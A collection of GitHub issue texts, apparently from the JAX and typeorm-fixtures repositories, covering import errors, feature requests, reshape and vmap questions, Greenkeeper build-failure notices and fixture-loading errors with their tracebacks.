TypeError                                 Traceback (most recent call last)
<ipython-input-1-0480bfae9932> in <module>
      1 from tensorflow.contrib.framework.python.ops import add_arg_scope
----> 2 import jax

~/dev/jax/jax/__init__.py in <module>
     15 import os
     16 os.environ.setdefault('TF_CPP_MIN_LOG_LEVEL', '1')
---> 17 from jax.api import *
     18 import jax.numpy as np  # side-effecting import sets up operator overloads

~/dev/jax/jax/api.py in <module>
     43 from .util import (unzip2, unzip3, curry, partial, safe_map, safe_zip,
     44                    WrapHashably, prod)
---> 45 from .lib.xla_bridge import canonicalize_dtype
     46 from .abstract_arrays import ShapedArray
     47 from .interpreters import partial_eval as pe

~/dev/jax/jax/lib/xla_bridge.py in <module>
     31 import numpy as onp  # 'onp' rather than 'np' to distinguish from autograd.numpy
     32
---> 33 from jaxlib import xla_data_pb2
     34 from jaxlib import xla_client
     35

~/miniconda3/envs/python36/lib/python3.6/site-packages/jaxlib/xla_data_pb2.py in <module>
     21   syntax='proto3',
     22   serialized_options=_b('\370\001\001'),
---> 23   serialized_pb=_b('\n&tensorflow/compiler/xla/xla_data.proto\x12\x03xla\"\xb7\x01\n\rPaddingConfig\x12=\n\ndimensions\x18\x01 \x03(\x0b\x32).xla.PaddingConfig.PaddingConfigDimension\x1ag\n\x16PaddingConfigDimension\x12\x18\n\x10\x65\x64ge_padding_low\x18\x01 \x01
(\x03\x12\x19\n\x11\x65\x64ge_padding_high\x18\x02 \x01(\x03\x12\x18\n\x10interior_padding\x18\x03 \x01(\x03\"\x1f\n\tTileProto\x12\x12\n\ndimensions\x18\x01 \x03(\x03\"\xca\x01\n\x0bLayoutProto\x12\x1b\n\x06\x66ormat\x18\x04 \x01(\x0e\x32\x0b.xla.Format\x12\x16\n\x0emino
r_to_major\x18\x01 \x03(\x03\x12\x1b\n\x13max_sparse_elements\x18\x05 \x01(\x03\x12\x1d\n\x05tiles\x18\x06 \x03(\x0b\x32\x0e.xla.TileProto\x12\x1c\n\x14\x65lement_size_in_bits\x18\x07 \x01(\x03J\x04\x08\x02\x10\x03J\x04\x08\x03\x10\x04R\x11padded_dimensionsR\rpadding_valu
e\"\xbd\x01\n\nShapeProto\x12(\n\x0c\x65lement_type\x18\x02 \x01(\x0e\x32\x12.xla.PrimitiveType\x12\x12\n\ndimensions\x18\x03 \x03(\x03\x12%\n\x0ctuple_shapes\x18\x04 \x03(\x0b\x32\x0f.xla.ShapeProto\x12 \n\x06layout\x18\x05 \x01(\x0b\x32\x10.xla.LayoutProto\x12\x1c\n\x14
is_dynamic_dimension\x18\x06 \x03(\x08J\x04\x08\x01\x10\x02R\x04rank\"r\n\x11ProgramShapeProto\x12#\n\nparameters\x18\x01 \x03(\x0b\x32\x0f.xla.ShapeProto\x12\x1f\n\x06result\x18\x02 \x01(\x0b\x32\x0f.xla.ShapeProto\x12\x17\n\x0fparameter_names\x18\x03 \x03(\t\"D\n\x10\x43omputationStats\x12\x12\n\nflop_count\x18\x01 \x01(\x01\x12\x1c\n\x14transcendental_count\x18\x02 \x01(\x01\"X\n\nOpMetadata\x12\x0f\n\x07op_type\x18\x01 \x01(\t\x12\x0f\n\x07op_name\x18\x02 \x01(\t\x12\x13\n\x0bsource_file\x18\x03 \x01(\t\x12\x13\n\x0bsource_line\x18\x04 \x01(\x05\"\xc8\x01\n\x10\x45xecutionProfile\x12\x1d\n\x15\x63ompilation_cache_hit\x18\x01 \x01(\x08\x12\x17\n\x0f\x63ompile_time_ms\x18\x02 \x01(\x03\x12\x1b\n\x13\x63ompute_cycle_count\x18\x03 \x01(\x03\x12\x17\n\x0f\x63ompute_time_ns\x18\x04 \x01(\x03\x12$\n\x1c\x63ompute_and_transfer_time_ns\x18\x05 \x01(\x03\x12 \n\x18\x65xecutable_size_in_bytes\x18\x06 \x01(\x03\"!\n\x0f\x45xecutionHandle\x12\x0e\n\x06handle\x18\x01 \x01(\x03\"\"\n\x10GlobalDataHandle\x12\x0e\n\x06handle\x18\x01 \x01(\x03\"4\n\x0c\x44\x65viceHandle\x12\x0e\n\x06handle\x18\x01 \x01(\x03\x12\x14\n\x0c\x64\x65vice_count\x18\x02 \x01(\x03\"\xb4\x01\n\rChannelHandle\x12\x0e\n\x06handle\x18\x01 \x01(\x03\x12,\n\x04type\x18\x02 \x01(\x0e\x32\x1e.xla.ChannelHandle.ChannelType\"e\n\x0b\x43hannelType\x12\x18\n\x14\x43HANNEL_TYPE_INVALID\x10\x00\x12\x14\n\x10\x44\x45VICE_TO_DEVICE\x10\x01\x12\x12\n\x0e\x44\x45VICE_TO_HOST\x10\x02\x12\x12\n\x0eHOST_TO_DEVICE\x10\x03\"\xc5\x01\n\x15\x44\x65viceAssignmentProto\x12\x15\n\rreplica_count\x18\x01 \x01(\x05\x12\x19\n\x11\x63omputation_count\x18\x02 \x01(\x05\x12I\n\x13\x63omputation_devices\x18\x03 \x03(\x0b\x32,.xla.DeviceAssignmentProto.ComputationDevice\x1a/\n\x11\x43omputationDevice\x12\x1a\n\x12replica_device_ids\x18\x01 \x03(\x05\"\xc4\x02\n\x0cLiteralProto\x12\x1e\n\x05shape\x18\x01 \x01(\x0b\x32\x0f.xla.ShapeProto\x12\r\n\x05preds\x18\x02 \x03(\x08\x12\x0b\n\x03s8s\x18\x0f \x01(\x0c\x12\x0b\n\x03u8s\x18\x03 \x01(\x0c\x12\x0c\n\x04s32s\x18\x04 \x03(\x05\x12\x0c\n\x04s64s\x18\x05 \x03(\x03\x12\x0c\n\x04u32s\x18\x06 \x03(\r\x12\x0c\n\x04u64s\x18\x07 \x03(\x04\x12\x0c\n\x04\x66\x33\x32s\x18\x08 \x03(\x02\x12\x0c\n\x04\x66\x36\x34s\x18\t \x03(\x01\x12\x0c\n\x04\x63\x36\x34s\x18\x0c \x03(\x02\x12\r\n\x05\x63\x31\x32\x38s\x18\x12 \x03(\x01\x12)\n\x0etuple_literals\x18\n \x03(\x0b\x32\x11.xla.LiteralProto\x12\x0c\n\x04\x66\x31\x36s\x18\x0b \x01(\x0c\x12\r\n\x05\x62\x66\x31\x36s\x18\r \x01(\x0c\x12\x0c\n\x04u16s\x18\x10 \x01(\x0c\x12\x0c\n\x04s16s\x18\x11 \x01(\x0c\x12\x16\n\x0esparse_indices\x18\x0e \x03(\x03\"\xa3\x01\n\x0fWindowDimension\x12\x0c\n\x04size\x18\x01 \x01(\x03\x12\x0e\n\x06stride\x18\x02 \x01(\x03\x12\x13\n\x0bpadding_low\x18\x03 \x01(\x03\x12\x14\n\x0cpadding_high\x18\x04 \x01(\x03\x12\x17\n\x0fwindow_dilation\x18\x05 \x01(\x03\x12\x15\n\rbase_dilation\x18\x06 \x01(\x03\x12\x17\n\x0fwindow_reversal\x18\x07 \x01(\x08\"2\n\x06Window\x12(\n\ndimensions\x18\x01 \x03(\x0b\x32\x14.xla.WindowDimension\"~\n\x16GatherDimensionNumbers\x12\x13\n\x0boffset_dims\x18\x01 \x03(\x03\x12\x1c\n\x14\x63ollapsed_slice_dims\x18\x02 \x03(\x03\x12\x17\n\x0fstart_index_map\x18\x03 \x03(\x03\x12\x18\n\x10index_vector_dim\x18\x04 \x01(\x03\"\x93\x01\n\x17ScatterDimensionNumbers\x12\x1a\n\x12update_window_dims\x18\x01 \x03(\x03\x12\x1c\n\x14inserted_window_dims\x18\x02 \x03(\x03\x12$\n\x1cscatter_dims_to_operand_dims\x18\x03 \x03(\x03\x12\x18\n\x10index_vector_dim\x18\x04 \x01(\x03\"\xd8\x02\n\x1b\x43onvolutionDimensionNumbers\x12\x1d\n\x15input_batch_dimension\x18\x07 \x01(\x03\x12\x1f\n\x17input_feature_dimension\x18\x08 \x01(\x03\x12 \n\x18input_spatial_dimensions\x18\x0b \x03(\x03\x12&\n\x1ekernel_input_feature_dimension\x18\x03 \x01(\x03\x12\'\n\x1fkernel_output_feature_dimension\x18\x04 \x01(\x03\x12!\n\x19kernel_spatial_dimensions\x18\x06 \x03(\x03\x12\x1e\n\x16output_batch_dimension\x18\t \x01(\x03\x12 \n\x18output_feature_dimension\x18\n \x01(\x03\x12!\n\x19output_spatial_dimensions\x18\x0c \x03(\x03\"\x99\x01\n\x13\x44otDimensionNumbers\x12\"\n\x1alhs_contracting_dimensions\x18\x01 \x03(\x03\x12\"\n\x1arhs_contracting_dimensions\x18\x02 \x03(\x03\x12\x1c\n\x14lhs_batch_dimensions\x18\x03 \x03(\x03\x12\x1c\n\x14rhs_batch_dimensions\x18\x04 \x03(\x03\"\xdf\x01\n\x16TriangularSolveOptions\x12\x11\n\tleft_side\x18\x01 \x01(\x08\x12\r\n\x05lower\x18\x02 \x01(\x08\x12\x15\n\runit_diagonal\x18\x03 \x01(\x08\x12:\n\x0btranspose_a\x18\x04 \x01(\x0e\x32%.xla.TriangularSolveOptions.Transpose\"P\n\tTranspose\x12\x15\n\x11TRANSPOSE_INVALID\x10\x00\x12\x10\n\x0cNO_TRANSPOSE\x10\x01\x12\r\n\tTRANSPOSE\x10\x02\x12\x0b\n\x07\x41\x44JOINT\x10\x03\"\xff\x01\n\nOpSharding\x12\"\n\x04type\x18\x01 \x01(\x0e\x32\x14.xla.OpSharding.Type\x12#\n\ntile_shape\x18\x02 \x01(\x0b\x32\x0f.xla.ShapeProto\x12\"\n\x1atile_assignment_dimensions\x18\x03 \x03(\x03\x12\x1f\n\x17tile_assignment_devices\x18\x04 \x03(\x03\x12(\n\x0ftuple_shardings\x18\x05 \x03(\x0b\x32\x0f.xla.OpSharding\"9\n\x04Type\x12\x0e\n\nREPLICATED\x10\x00\x12\x0b\n\x07MAXIMAL\x10\x01\x12\t\n\x05TUPLE\x10\x02\x12\t\n\x05OTHER\x10\x03\"#\n\x0cReplicaGroup\x12\x13\n\x0breplica_ids\x18\x01 \x03(\x03\".\n\x0cSourceTarget\x12\x0e\n\x06source\x18\x01 \x01(\x03\x12\x0e\n\x06target\x18\x02 \x01(\x03\"}\n\x0fPrecisionConfig\x12\x39\n\x11operand_precision\x18\x01 \x03(\x0e\x32\x1e.xla.PrecisionConfig.Precision\"/\n\tPrecision\x12\x0b\n\x07\x44\x45\x46\x41ULT\x10\x00\x12\x08\n\x04HIGH\x10\x01\x12\x0b\n\x07HIGHEST\x10\x02*\xd5\x01\n\rPrimitiveType\x12\x1a\n\x16PRIMITIVE_TYPE_INVALID\x10\x00\x12\x08\n\x04PRED\x10\x01\x12\x06\n\x02S8\x10\x02\x12\x07\n\x03S16\x10\x03\x12\x07\n\x03S32\x10\x04\x12\x07\n\x03S64\x10\x05\x12\x06\n\x02U8\x10\x06\x12\x07\n\x03U16\x10\x07\x12\x07\n\x03U32\x10\x08\x12\x07\n\x03U64\x10\t\x12\x07\n\x03\x46\x31\x36\x10\n\x12\x07\n\x03\x46\x33\x32\x10\x0b\x12\x08\n\x04\x42\x46\x31\x36\x10\x10\x12\x07\n\x03\x46\x36\x34\x10\x0c\x12\x07\n\x03\x43\x36\x34\x10\x0f\x12\x08\n\x04\x43\x31\x32\x38\x10\x12\x12\t\n\x05TUPLE\x10\r\x12\n\n\x06OPAQUE\x10\x0e\x12\t\n\x05TOKEN\x10\x11*3\n\x06\x46ormat\x12\x12\n\x0eINVALID_FORMAT\x10\x00\x12\t\n\x05\x44\x45NSE\x10\x01\x12\n\n\x06SPARSE\x10\x02*1\n\x07\x46\x66tType\x12\x07\n\x03\x46\x46T\x10\x00\x12\x08\n\x04IFFT\x10\x01\x12\x08\n\x04RFFT\x10\x02\x12\t\n\x05IRFFT\x10\x03*F\n\x12RandomDistribution\x12\x0f\n\x0bRNG_INVALID\x10\x00\x12\x0f\n\x0bRNG_UNIFORM\x10\x01\x12\x0e\n\nRNG_NORMAL\x10\x02\x42\x03\xf8\x01\x01\x62\x06proto3')
     24 )
     25

~/miniconda3/envs/python36/lib/python3.6/site-packages/google/protobuf/descriptor.py in __new__(cls, name, package, options, serialized_options, serialized_pb, dependencies, public_dependencies, syntax, pool)
    876         # TODO(amauryfa): use the pool passed as argument. This will work only
    877         # for C++-implemented DescriptorPools.
--> 878         return _message.default_pool.AddSerializedFile(serialized_pb)
    879       else:
    880         return super(FileDescriptor, cls).__new__(cls)

TypeError: Couldn't build proto file into descriptor pool!
Invalid proto descriptor for file "tensorflow/compiler/xla/xla_data.proto":
  tensorflow/compiler/xla/xla_data.proto: A file with this name is already in the pool.
``` Hi there,

Adding support for `scipy.stats.norm.logcdf` would be very useful to me (for probit in the likelihood).

A workaround would be good too. I saw there is `erf`, but I could really do with a log version for numerical reasons.

Thanks! Hi there,

Big fan of Jax, thanks for making this!

I believe there is a problem with specifying the reshaping order:

```python
a = np.arange(6) + 1
np.reshape(a, (3, 2), order='F')
```

Should give:

```
array([[1, 4],
       [2, 5],
       [3, 6]])
```

But instead gives:

```
array([[1, 2],
       [3, 4],
       [5, 6]], dtype=int32)
```

Basically, it is ignored and always does column-major reordering. If unsupported, it would be nice for it to just fail rather than silently carry on. In TF and PyTorch, there is an easy way to tell if the GPU is being used (see below).
How can we do this with jax? 

import tensorflow as tf
if tf.test.is_gpu_available():
    print(tf.test.gpu_device_name())
else:
    print("TF cannot find GPU")

import torch
import torchvision
if torch.cuda.is_available():
    print(torch.cuda.get_device_name(0))
else:
    print("Torch cannot find GPU") Hi

Jax cannot find libdevice.
 I'm running Python 3.7 with cuda 10.0 on my personal laptop qwith a GeForce RTX 2080.
I installed jax using pip.

I made a little test script shown below

```
import os
os.environ["XLA_FLAGS"]="--xla_gpu_cuda_data_dir=/home/murphyk/miniconda3/lib"
os.environ["CUDA_HOME"]="/usr"


import jax
import jax.numpy as np
print("jax version {}".format(jax.__version__))
from jax.lib import xla_bridge
print("jax backend {}".format(xla_bridge.get_backend().platform))


from jax import random
key = random.PRNGKey(0)
x = random.normal(key, (5,5))
print(x)
```

The output is shown below.


```
jax version 0.1.39
jax backend gpu
2019-07-07 16:44:03.905071: W external/org_tensorflow/tensorflow/compiler/xla/service/gpu/llvm_gpu_backend/nvptx_backend_lib.cc:105] Unknown compute capability (7, 5) .Defaulting to libdevice for compute_20
Traceback (most recent call last):

  File "<ipython-input-15-e39e42274024>", line 1, in <module>
    runfile('/home/murphyk/github/pyprobml/scripts/jax_debug.py', wdir='/home/murphyk/github/pyprobml/scripts')

  File "/home/murphyk/miniconda3/lib/python3.7/site-packages/spyder_kernels/customize/spydercustomize.py", line 827, in runfile
    execfile(filename, namespace)

  File "/home/murphyk/miniconda3/lib/python3.7/site-packages/spyder_kernels/customize/spydercustomize.py", line 110, in execfile
    exec(compile(f.read(), filename, 'exec'), namespace)

  File "/home/murphyk/github/pyprobml/scripts/jax_debug.py", line 18, in <module>
    x = random.normal(key, (5,5))

  File "/home/murphyk/miniconda3/lib/python3.7/site-packages/jax/random.py", line 389, in normal
    return _normal(key, shape, dtype)

  File "/home/murphyk/miniconda3/lib/python3.7/site-packages/jax/api.py", line 123, in f_jitted
    out = xla.xla_call(flat_fun, *args_flat, device_values=device_values)

  File "/home/murphyk/miniconda3/lib/python3.7/site-packages/jax/core.py", line 663, in call_bind
    ans = primitive.impl(f, *args, **params)

  File "/home/murphyk/miniconda3/lib/python3.7/site-packages/jax/interpreters/xla.py", line 606, in xla_call_impl
    compiled_fun = xla_callable(fun, device_values, *map(abstractify, args))

  File "/home/murphyk/miniconda3/lib/python3.7/site-packages/jax/linear_util.py", line 208, in memoized_fun
    ans = call(f, *args)

  File "/home/murphyk/miniconda3/lib/python3.7/site-packages/jax/interpreters/xla.py", line 621, in xla_callable
    compiled, result_shape = compile_jaxpr(jaxpr, consts, *abstract_args)

  File "/home/murphyk/miniconda3/lib/python3.7/site-packages/jax/interpreters/xla.py", line 207, in compile_jaxpr
    backend=xb.get_backend()), result_shape

  File "/home/murphyk/miniconda3/lib/python3.7/site-packages/jaxlib/xla_client.py", line 535, in Compile
    return backend.compile(self.computation, compile_options)

  File "/home/murphyk/miniconda3/lib/python3.7/site-packages/jaxlib/xla_client.py", line 118, in compile
    compile_options.device_assignment)

RuntimeError: Not found: ./libdevice.compute_20.10.bc not found
```


 I am having some problems adapting the NumpyLoader class defined at
https://github.com/google/jax/blob/master/notebooks/neural_network_and_data_loading.ipynb
to my use case.

Here is a MWE of the problem.
```
import numpy as np
import torch
N = 6; D = 2;
X = np.random.randn(N,D)
y = np.random.rand(N)
data_set = TensorDataset(torch.Tensor(X), torch.Tensor(y))
loader = NumpyLoader(data_set, batch_size=2, shuffle=False) 
for step, (x,y) in enumerate(loader):
    print(y)
```
Here is the error:
```
 File "<ipython-input-68-607153b43fa9>", line 6, in <module>
    for step, (x,y) in enumerate(loader):

  File "/home/murphyk/miniconda3/envs/jax/lib/python3.7/site-packages/torch/utils/data/dataloader.py", line 560, in __next__
    batch = self.collate_fn([self.dataset[i] for i in indices])

  File "<ipython-input-45-880dfc65d9c4>", line 8, in numpy_collate
    return [numpy_collate(samples) for samples in transposed]

  File "<ipython-input-45-880dfc65d9c4>", line 8, in <listcomp>
    return [numpy_collate(samples) for samples in transposed]

  File "<ipython-input-45-880dfc65d9c4>", line 10, in numpy_collate
    return np.array(batch)

ValueError: only one element tensors can be converted to Python scalars
```

I know this is not a core JAX thing, but it would be nice to fix.
(I tried but failed to do so, since I don't know enough about PyTorch dataloaders.
The MNIST version in the notebook works fine.)





 Hi

I'd like to vectorize the following '1d truncated Gaussian kernel' function

```
def kernel_scalar(x, lam=0.18, beta=1.0):
    if np.abs(x) > lam:
        return 0.0
    else:
        return np.exp(-beta*x**2)
```

I tried this
```
def kernel(xs):
    kernels = vmap(kernel_scalar)(xs)
    return kernels
```

but  when I try this
```
n = 10
xs = onp.random.randn(n)
k = kernel(xs)
```
I get this error
```
...
  File "/Users/kpmurphy/github/pyprobml/scripts/mean_shift_opt.py", line 8, in kernel_scalar
    if np.abs(x) > lam:

  File "/anaconda3/lib/python3.6/site-packages/jax/core.py", line 342, in __bool__
    def __bool__(self): return self.aval._bool(self)

  File "/anaconda3/lib/python3.6/site-packages/jax/abstract_arrays.py", line 38, in error
    raise TypeError(concretization_err_msg(fun))

TypeError: Abstract value passed to `bool`, which requires a concrete value. The function to be transformed can't be traced at the required level of abstraction. If using `jit`, try using `static_argnums` or applying `jit` to smaller subfunctions instead
```

I realize that dynamic if is not allowed inside jit, but I am not (explicitly) calling jit.
Also the return of both branches has the same type and shape, so why does
the value matter?

(I also realize it's easy to vectorize this  function with vanilla numpy, but I was hoping vmap would let me do everything with just scalar arithmetic :)
 [flake8](http://flake8.pycqa.org) testing of https://github.com/google/jax  on Python 3.7.1

$ __flake8 . --count --select=E901,E999,F821,F822,F823 --show-source --statistics__
```
./jax/interpreters/parallel.py:249:38: F821 undefined name 'vals'
      return call_primitive.bind(f, *vals, **params)
                                     ^
./jax/interpreters/parallel.py:372:10: F821 undefined name '_scatter'
  return _scatter(source, target, target_axis, name)
         ^
./jax/interpreters/parallel.py:422:9: F821 undefined name 'rescatter'
    x = rescatter(x, ydim, name)
        ^
3     F821 undefined name 'vals'
3
```
__E901,E999,F821,F822,F823__ are the "_showstopper_" [flake8](http://flake8.pycqa.org) issues that can halt the runtime with a SyntaxError, NameError, etc. These 5 are different from most other flake8 issues which are merely "style violations" -- useful for readability but they do not effect runtime safety.
* F821: undefined name `name`
* F822: undefined name `name` in `__all__`
* F823: local variable name referenced before assignment
* E901: SyntaxError or IndentationError
* E999: SyntaxError -- failed to compile a file into an Abstract Syntax Tree
 I've made the same mistake a few times on `static_argnums` on `jit` function, by not using a tuple 

e.g., `jit(f, static_argnums=1)`
would it be possible / reasonable to add a simple `if` statement to convert it to tuple?

where the correct way is  `jit(f, static_argnums=(1,) )`

also note `(1)` is not a tuple,  but `(1,)` is


<---------->
154982575

## The devDependency [tslint-immutable](https://github.com/jonaskello/tslint-immutable) was updated from `5.3.3` to `5.4.0`.

🚨 [View failing branch](https://github.com/RobinCK/typeorm-fixtures/compare/master...RobinCK:greenkeeper%2Ftslint-immutable-5.4.0).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.




tslint-immutable is a devDependency of this project. It **might not break your production code or affect downstream projects**, but probably breaks your build or test tools, which may **prevent deploying or publishing**.



<details>
<summary>Status Details</summary>

- ❌ **ci/circleci: build:** Your tests failed on CircleCI ([Details](https://circleci.com/gh/RobinCK/typeorm-fixtures/102?utm_campaign=vcs-integration-link&utm_medium=referral&utm_source=github-build-link)).
</details>


---




<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 I've been trying to check the possibility to set the generation seed for the fixtures, so they can be reproducible in tests, however I haven't seen the `faker.seed()` call anywhere in the code.

Is there any possibility to add some sort of configuration to the project so tests can be reproducible? 
## The devDependency [@types/lodash](https://github.com/DefinitelyTyped/DefinitelyTyped) was updated from `4.14.140` to `4.14.141`.

🚨 [View failing branch](https://github.com/RobinCK/typeorm-fixtures/compare/master...RobinCK:greenkeeper%2F%40types%2Flodash-4.14.141).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.




@types/lodash is a devDependency of this project. It **might not break your production code or affect downstream projects**, but probably breaks your build or test tools, which may **prevent deploying or publishing**.



<details>
<summary>Status Details</summary>

- ❌ **ci/circleci: build:** Your tests failed on CircleCI ([Details](https://circleci.com/gh/RobinCK/typeorm-fixtures/325?utm_campaign=vcs-integration-link&utm_medium=referral&utm_source=github-build-link)).
</details>


---




<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 Calling Methods feature only works when a processor is defined

https://github.com/RobinCK/typeorm-fixtures/blob/master/src/Builder.ts#L57

 Hello,

There is a typo when calling methods in README.md.  _call is used twice instead of __call. we use `ormconfig.ts` because it is most flexible for configuration `TypeOrm`
`npx fixtures -c ormconfig.ts database/fixtures`
output
```
Fail fixture loading: Unexpected token {
(node:32337) UnhandledPromiseRejectionWarning: ConnectionNotFoundError: Connection "default" was not found.
``` I have a manyToMany relationship in one of my entities and if I comment it out it works fine: something like the following:

```
@ManyToMany(type => Subject, subject => subject.tutors)
@JoinTable()
subjects: Subject[]
```

after trying to run the fixture I get:
```
Fail fixture loading: Maximum call stack size exceeded
RangeError: Maximum call stack size exceeded
```

Has anyone tried getting fixtures to work with ManyToMany relationships? we use `ormconfig.ts` because it is most flexible for configuration `TypeOrm` I was wondering if it's possible to use the current iteration as a string value in a field instead of just referencing relations. Like this:

``
entity: User
items:
  user{1..10}:
    firstName: '{{name.firstName}}'
    lastName: '{{name.lastName}}'
    email: 'email{{current}}@gmail.com'
``

This way all the fixtures will have email1@gmail.com -> email10@gmail.com 
## There have been updates to the *commitlint* monorepo:

 + - The `devDependency` [@commitlint/cli](https://github.com/conventional-changelog/commitlint) was updated from `8.0.0` to `8.1.0`.
- The `devDependency` [@commitlint/config-conventional](https://github.com/conventional-changelog/commitlint) was updated from `8.0.0` to `8.1.0`.


🚨 [View failing branch](https://github.com/RobinCK/typeorm-fixtures/compare/master...RobinCK:greenkeeper%2Fmonorepo.commitlint-20190715185122).

This version is **covered** by your **current version range** and after updating it in your project **the build failed**.

This monorepo update includes releases of one or more dependencies which all belong to the [commitlint group definition](https://github.com/greenkeeperio/monorepo-definitions).


commitlint is a devDependency of this project. It **might not break your production code or affect downstream projects**, but probably breaks your build or test tools, which may **prevent deploying or publishing**.



<details>
<summary>Status Details</summary>

- ❌ **ci/circleci: build:** Your tests failed on CircleCI ([Details](https://circleci.com/gh/RobinCK/typeorm-fixtures/256?utm_campaign=vcs-integration-link&utm_medium=referral&utm_source=github-build-link)).
</details>


---

<details>
<summary>Commits</summary>
<p>The new version differs by 39 commits.</p>
<ul>
<li><a href="https://urls.greenkeeper.io/conventional-changelog/commitlint/commit/c17420d67adafdf37f68d6861d29a0e85a4a3bd7"><code>c17420d</code></a> <code>v8.1.0</code></li>
<li><a href="https://urls.greenkeeper.io/conventional-changelog/commitlint/commit/ca19d70b2c73b2857d4bfbd483c6c7929d946ad6"><code>ca19d70</code></a> <code>chore: update dependency lodash to v4.17.14 (#724)</code></li>
<li><a href="https://urls.greenkeeper.io/conventional-changelog/commitlint/commit/5757ef28fd1051ff697b86b8bea19aa508faf604"><code>5757ef2</code></a> <code>build(deps): bump lodash.template from 4.4.0 to 4.5.0 (#721)</code></li>
<li><a href="https://urls.greenkeeper.io/conventional-changelog/commitlint/commit/5b5f8557e432cb275cb1ff3f6684edf32278ae6c"><code>5b5f855</code></a> <code>build(deps): bump lodash.merge from 4.6.0 to 4.6.2 (#722)</code></li>
<li><a href="https://urls.greenkeeper.io/conventional-changelog/commitlint/commit/4cb979df81328684467fd0dad130440ce725831d"><code>4cb979d</code></a> <code>build(deps): bump lodash from 4.17.11 to 4.17.13 (#723)</code></li>
<li><a href="https://urls.greenkeeper.io/conventional-changelog/commitlint/commit/a89c1ba8292d4ca8be4e06d60cc00ce21ddd960b"><code>a89c1ba</code></a> <code>chore: add devcontainer setup</code></li>
<li><a href="https://urls.greenkeeper.io/conventional-changelog/commitlint/commit/9aa57094814f8b55e352c997025e2a00d0d1f00d"><code>9aa5709</code></a> <code>chore: pin dependencies (#714)</code></li>
<li><a href="https://urls.greenkeeper.io/conventional-changelog/commitlint/commit/c9ef5e2c40fdd834775b400937fafaf4ca28ee04"><code>c9ef5e2</code></a> <code>chore: centralize typescript and jest setups (#710)</code></li>
<li><a href="https://urls.greenkeeper.io/conventional-changelog/commitlint/commit/c9dcf1a0996335faf02daf3d707ab1a328865ee8"><code>c9dcf1a</code></a> <code>chore: pin dependencies (#708)</code></li>
<li><a href="https://urls.greenkeeper.io/conventional-changelog/commitlint/commit/6a6a8b070995cd98e4be57ebc7f3ed25ecaa8179"><code>6a6a8b0</code></a> <code>refactor: rewrite top level to typescript (#679)</code></li>
<li><a href="https://urls.greenkeeper.io/conventional-changelog/commitlint/commit/0fedbc09fbbd838f75ecae7d90345e28f66ff84a"><code>0fedbc0</code></a> <code>chore: update dependency @types/jest to v24.0.15 (#694)</code></li>
<li><a href="https://urls.greenkeeper.io/conventional-changelog/commitlint/commit/0b9c7ed4aff7a1c0208cafb2f6fd53bce450d416"><code>0b9c7ed</code></a> <code>chore: update dependency typescript to v3.5.2 (#695)</code></li>
<li><a href="https://urls.greenkeeper.io/conventional-changelog/commitlint/commit/4efb34b8023aff05ebdcffb9d8e34be447e84c88"><code>4efb34b</code></a> <code>chore: update dependency globby to v10 (#705)</code></li>
<li><a href="https://urls.greenkeeper.io/conventional-changelog/commitlint/commit/804af8bcbf3fb8a4197040b5ba7c96e692fbd1f6"><code>804af8b</code></a> <code>chore: update dependency lint-staged to v8.2.1 (#696)</code></li>
<li><a href="https://urls.greenkeeper.io/conventional-changelog/commitlint/commit/90758444079470763d0d7b9f6344f40d471a8eb3"><code>9075844</code></a> <code>fix: add explicit dependency on chalk (#687)</code></li>
</ul>
<p>There are 39 commits in total.</p>
<p>See the <a href="https://urls.greenkeeper.io/conventional-changelog/commitlint/compare/29d1cee10ee7734a85d97ef039c4ce2da633628c...c17420d67adafdf37f68d6861d29a0e85a4a3bd7">full diff</a></p>
</details>


<details>
<summary>FAQ and help</summary>

There is a collection of [frequently asked questions](https://greenkeeper.io/faq.html). If those don’t help, you can always [ask the humans behind Greenkeeper](https://github.com/greenkeeperio/greenkeeper/issues/new).
</details>

---


Your [Greenkeeper](https://greenkeeper.io) Bot :palm_tree:
 During installation of typeorm-fixtures-cli following warning is generated:

`warning typeorm-fixtures-cli > joi@14.3.1: This module has moved and is now available at @hapi/joi. Please update your dependencies as this version is no longer maintained an may contain bugs and security issues.
`
 I have a makefile with a command:

`db-sync: 
	NODE_ENV=$(NODE_ENV) $(NPM_BIN)/fixtures --config ./ormconfig.js --sync --debug ./data/fixtures
`
When I run this code, I get:
`Fail fixture loading: Unexpected token {
(node:53075) UnhandledPromiseRejectionWarning: CannotExecuteNotConnectedError: Cannot execute operation on "default" connection because connection is not yet established.
    at new CannotExecuteNotConnectedError (/Users/marcio/Development/projects/personal/typescript-express-di-orm/node_modules/typeorm/error/CannotExecuteNotConnectedError.js:10:28)
    at Connection.<anonymous> (/Users/marcio/Development/projects/personal/typescript-express-di-orm/node_modules/typeorm/connection/Connection.js:173:35)
    at step (/Users/marcio/Development/projects/personal/typescript-express-di-orm/node_modules/tslib/tslib.js:136:27)
    at Object.next (/Users/marcio/Development/projects/personal/typescript-express-di-orm/node_modules/tslib/tslib.js:117:57)
    at /Users/marcio/Development/projects/personal/typescript-express-di-orm/node_modules/tslib/tslib.js:110:75
    at new Promise (<anonymous>)
    at Object.__awaiter (/Users/marcio/Development/projects/personal/typescript-express-di-orm/node_modules/tslib/tslib.js:106:16)
    at Connection.close (/Users/marcio/Development/projects/personal/typescript-express-di-orm/node_modules/typeorm/connection/Connection.js:168:24)
    at Object.<anonymous> (/Users/marcio/Development/projects/personal/typescript-express-di-orm/node_modules/typeorm-fixtures-cli/dist/cli.js:111:37)
    at Generator.next (<anonymous>)
(node:53075) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 2)
(node:53075) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.`

**Fun fact:** I use the same configuration to run fixtures before my unit-tests programmatically and works well

**ormconfig.js**
`{ 
   "name":"default",
   "type":"mysql",
   "host":"127.0.0.1",
   "port":3306,
   "username":"blablabla",
   "password":"blablabla",
